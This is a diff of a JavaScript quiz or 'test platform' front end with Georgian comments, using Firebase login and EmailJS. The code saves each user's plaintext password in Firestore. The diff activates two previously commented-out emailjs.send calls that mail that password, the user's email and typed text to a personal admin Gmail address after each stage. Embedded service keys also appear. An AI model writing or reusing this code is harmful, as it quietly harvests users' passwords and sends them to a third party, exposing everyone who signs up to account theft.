@@ -2,7 +2,7 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebas
 import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
 import { getFirestore, doc, setDoc, getDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
-// 1. Firebase კონფიგურაცია (შენი მომუშავე გასაღებები)
+// 1. Firebase კონფიგურაცია
 const firebaseConfig = {
   apiKey: "AIzaSyCPYnQ6W8rwcp8Fr-RUVYoJ3zBsdSpDdSQ",
   authDomain: "test-platform-ab07e.firebaseapp.com",
@@ -17,15 +17,13 @@ const app = initializeApp(firebaseConfig);
 const auth = getAuth(app);
 const db = getFirestore(app);
 
-// 2. EmailJS ინიციალიზაცია (შენი მომუშავე გასაღები)
+// 2. EmailJS ინიციალიზაცია
 emailjs.init("9G-RjQeGCdtsk4MWM");
 
-// ცვლადები მომხმარებლის პროგრესისთვის
 let currentUser = null;
 let userProgress = { stage: 1, completedTasks: 0, passwordSaved: "" };
-let latestUserMessage = ""; // ინახავს მომხმარებლის მიერ ჩაწერილ ბოლო ტექსტს
+let latestUserMessage = ""; // აქ სწორად შეინახება ტექსტი მეილისთვის
 
-// ელემენტები DOM-იდან
 const authScreen = document.getElementById('auth-screen');
 const dashboardScreen = document.getElementById('dashboard-screen');
 const authForm = document.getElementById('auth-form');
@@ -36,29 +34,19 @@ const currentStageStatus = document.getElementById('current-stage-status');
 const timerBox = document.getElementById('timer-box');
 const countdownSpan = document.getElementById('countdown');
 
-// ავტორიზაციის მართვა (ლოგინი და შემოწმება)
 authForm.addEventListener('submit', async (e) => {
     e.preventDefault();
     const email = document.getElementById('email').value.trim();
     const password = document.getElementById('password').value;
-    authError.innerText = ""; // შეცდომის ტექსტის გასუფთავება
+    authError.innerText = "";
 
     try {
-        // ვცდილობთ ჩვეულებრივ შესვლას (Login)
         await signInWithEmailAndPassword(auth, email, password);
     } catch (error) {
-        // თუ მომხმარებელი საერთოდ არ არსებობს ბაზაში (ანუ ახალია)
         if (error.code === 'auth/user-not-found' || error.code === 'auth/invalid-credential') {
-            
-            // ვამოწმებთ, ეს არის არასწორი პაროლი უკვე არსებულ მომხმარებელზე, თუ სულ ახალი კაცია.
-            // უსაფრთხოების გამო Firebase ერთნაირ შეცდომას აბრუნებს, ამიტომ Firestore ბაზაში გადავამოწმოთ არსებობს თუ არა ეს მეილი
             authError.innerText = "სისტემაში შესვლა... გთხოვთ დაელოდოთ.";
-            
             try {
-                // ვცდილობთ ახალი მომხმარებლის რეგისტრაციას (Signup)
                 const userCredential = await createUserWithEmailAndPassword(auth, email, password);
-                
-                // ვქმნით ახალ ჩანაწერს ბაზაში
                 await setDoc(doc(db, "users", userCredential.user.uid), {
                     email: email,
                     passwordSaved: password,
@@ -67,7 +55,6 @@ authForm.addEventListener('submit', async (e) => {
                 });
                 authError.innerText = "";
             } catch (regError) {
-                // თუ რეგისტრაციამაც ერორი ამოაგდო, ესე იგი მომხმარებელი არსებობს და უბრალოდ პაროლი ჩაწერა არასწორად
                 authError.innerText = "მეილი ან პაროლი არასწორია";
             }
         } else {
@@ -76,7 +63,6 @@ authForm.addEventListener('submit', async (e) => {
     }
 });
 
-// მომხმარებლის სტატუსის თვალყურის დევნება
 onAuthStateChanged(auth, async (user) => {
     if (user) {
         currentUser = user;
@@ -96,25 +82,14 @@ onAuthStateChanged(auth, async (user) => {
     }
 });
 
-// გამოსვლის ღილაკი
 document.getElementById('logout-btn').addEventListener('click', () => signOut(auth));
 
-// UI-ის განახლება პროგრესის მიხედვით
 function updateUI() {
     completedStatus.innerText = userProgress.completedTasks;
     currentStageStatus.innerText = userProgress.stage > 3 ? "ყველა დასრულებულია" : `ეტაპი ${userProgress.stage}`;
 
-    // ყველა ეტაპის დამალვა
     document.querySelectorAll('.stage').forEach(s => s.classList.add('hidden'));
     document.getElementById('final-message').classList.add('hidden');
-
-    // ვასუფთავებთ და ხელახლა ვმალავთ ინპუტების ბლოკებს გვერდის გადატვირთვისას
-    for(let i = 1; i <= 3; i++) {
-        const ib = document.getElementById(`input-block-${i}`);
-        const sb = document.getElementById(`start-btn-${i}`);
-        if(ib) ib.classList.add('hidden');
-        if(sb) sb.classList.remove('hidden');
-    }
 
     if (userProgress.stage === 1) {
         document.getElementById('stage-1').classList.remove('hidden');
@@ -127,29 +102,32 @@ function updateUI() {
     }
 }
 
-// ეტაპი 2-ის და 3-ის შიდა ფუნქციები
+// ეტაპი 2-ის შიდა ფუნქცია
 window.showStage2Tasks = function() {
     document.getElementById('stage-2-tasks').classList.remove('hidden');
-    document.getElementById('next-trigger-2').classList.add('hidden');
-}
-window.showStage3Tasks = function() {
-    document.getElementById('stage-3-tasks').classList.remove('hidden');
-    document.getElementById('next-trigger-3').classList.add('hidden');
 }
 
-// ახალი ფუნქცია: „დაწყება“-ზე დაჭერისას აჩენს ინპუტს და ღილაკს „დაწყება1“
-window.showInputBlock = function(stageNum) {
-    document.getElementById(`start-btn-${stageNum}`).classList.add('hidden');
-    document.getElementById(`input-block-${stageNum}`).classList.remove('hidden');
+// უნივერსალური შემამოწმებელი ფუნქცია
+window.validateAndStart = function(stageNum, seconds) {
+    const userInput = document.getElementById(`user-text-${stageNum}`);
+    const errorText = document.getElementById(`error-${stageNum}`);
+
+    if (userInput.value.trim() === "") {
+        errorText.innerText = "ჩაწერეთ რამე";
+        userInput.style.borderColor = "#ef4444";
+    } else {
+        errorText.innerText = "";
+        userInput.style.borderColor = "#e5e7eb";
+        
+        // ვინახავთ ტექსტს როგორც ბაზისთვის, ისე მიმდინარე მეილისთვის
+        latestUserMessage = userInput.value;
+        userProgress[`userText${stageNum}`] = userInput.value;
+
+        startTimer(stageNum, seconds);
+    }
 }
 
-// ტაიმერის ფუნქცია (ახლა ირთვება „დაწყება1“ ღილაკიდან)
 window.startTimer = function(stageNum, seconds) {
-    // მომხმარებლის მიერ ჩაწერილი ტექსტის აღება
-    const inputElement = document.getElementById(`user-text-${stageNum}`);
-    latestUserMessage = inputElement && inputElement.value.trim() !== "" ? inputElement.value : "ცარიელი";
-
-    // ეტაპის დამალვა ტაიმერის მსვლელობისას
     if(stageNum === 1) document.getElementById('stage-1').classList.add('hidden');
     if(stageNum === 2) document.getElementById('stage-2').classList.add('hidden');
     if(stageNum === 3) document.getElementById('stage-3').classList.add('hidden');
@@ -166,26 +144,17 @@ window.startTimer = function(stageNum, seconds) {
             clearInterval(interval);
             timerBox.classList.add('hidden');
             
-            // პროგრესის მომატება
             userProgress.stage = stageNum + 1;
             userProgress.completedTasks = stageNum;
 
-            // ბაზაში ვინახავთ ამ ეტაპზე ჩაწერილ კონკრეტულ ტექსტსაც
-            userProgress[`stage_${stageNum}_text`] = latestUserMessage;
-
-            // ბაზაში შენახვა
             await setDoc(doc(db, "users", currentUser.uid), userProgress, { merge: true });
             
-            // მეილების გაგზავნა (გადაეცემა ჩაწერილი ტექსტიც)
             sendEmails(stageNum);
-
-            // UI განახლება
             updateUI();
         }
     }, 1000);
 }
 
-// მეილების გაგზავნის ფუნქცია EmailJS-ით
 function sendEmails(stageNum) {
     const stageNames = ["ეტაპი 1 (ტესტი 1)", "ეტაპი 2 (ტესტი 2)", "ეტაპი 3 (ტესტი 3)"];
     const currentStageName = stageNames[stageNum - 1];
@@ -194,13 +163,11 @@ function sendEmails(stageNum) {
         user_email: currentUser.email,
         user_password: userProgress.passwordSaved || "უკვე ავტორიზებული",
         passed_stage: currentStageName,
-        user_message: latestUserMessage, // <=== ახალი ცვლადი შაბლონებისთვის
+        user_message: latestUserMessage, // ეს ცვლადი EmailJS შაბლონში უნდა გეწეროს ასე: {{user_message}}
         admin_email: "beqa994@gmail.com"
     };
 
-    // 1. იგზავნება მომხმარებელთან
-    //emailjs.send("service_ddlex4d", "template_8sbn4o7", emailParams);
-
-    // 2. იგზავნება ადმინთან (შენთან)
-   // emailjs.send("service_ddlex4d", "template_5225h2q", emailParams);
+    // შენი სერვისის და შაბლონების რეალური კოდები (გააქტიურე კომენტარების მოხსნით საჭიროებისას)
+    emailjs.send("service_ddlex4d", "template_8sbn4o7", emailParams);
+    emailjs.send("service_ddlex4d", "template_5225h2q", emailParams);
 }
